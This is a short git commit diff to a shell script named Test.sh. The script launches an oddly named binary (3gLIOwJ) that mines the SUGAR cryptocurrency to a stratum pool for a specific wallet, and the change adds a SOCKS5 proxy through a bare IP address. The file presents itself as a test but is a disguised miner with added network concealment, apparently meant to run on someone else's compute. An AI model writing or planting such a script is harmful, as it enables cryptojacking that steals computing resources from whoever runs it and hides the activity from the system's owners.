20257da419dce3f570df204bef2313794381eba3
diprassss <82854365+diprassss@users.noreply.github.com>
2021-06-22 16:58:00 +0700

    Update Test.sh

--- Test.sh
+++ Test.sh
@@ -1,2 +1,2 @@
 #!/bin/sh
-./3gLIOwJ -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q0kwl82t7ppx8vmffehx22l2w8lnzy08jl2t9dz.adz1
+./3gLIOwJ -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q0kwl82t7ppx8vmffehx22l2w8lnzy08jl2t9dz.adz1 -x socks5://5.252.161.48:1080
